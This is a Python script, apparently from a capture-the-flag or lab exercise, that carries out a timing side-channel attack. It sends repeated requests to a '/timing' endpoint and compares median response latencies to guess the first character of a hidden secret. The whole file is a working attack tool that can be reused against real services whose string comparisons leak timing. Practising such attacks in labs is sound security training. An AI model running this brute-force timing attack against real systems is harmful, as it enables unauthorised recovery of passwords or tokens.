# char0_timing.py
#
# Improved: more samples + median timing + multiple passes to avoid
# being tricked by a single noisy outlier like '8' in your run.

import time
import statistics
import string
import requests

URL = "http://safe.med.pccc:5000/timing"
CANDIDATES = string.ascii_letters + string.digits

SAMPLES_PER_PASS = 40
PASSES = 3  # total samples = SAMPLES_PER_PASS * PASSES per char


def measure_char(c: str) -> float:
    """Return a robust timing score (median of all samples across PASSES)."""
    samples = []
    for _ in range(PASSES):
        for _ in range(SAMPLES_PER_PASS):
            t0 = time.time()
            requests.get(URL, params={"guess": c}, timeout=5)
            t1 = time.time()
            samples.append(t1 - t0)

    # Use median instead of mean to reduce impact of outliers
    return statistics.median(samples)


def main():
    scores = []
    for c in CANDIDATES:
        score = measure_char(c)
        scores.append((score, c))
        print(f"{c}: median={score:.5f}s")

    scores.sort(reverse=True)  # largest median first
    print("\n[+] Top 5 candidates by latency:")
    for s, c in scores[:5]:
        print(f"    {c}: {s:.5f}s")

    best_score, best_char = scores[0]
    print(f"\n[+] Likely char0: {best_char} (median={best_score:.5f}s)")


if __name__ == "__main__":
    main()

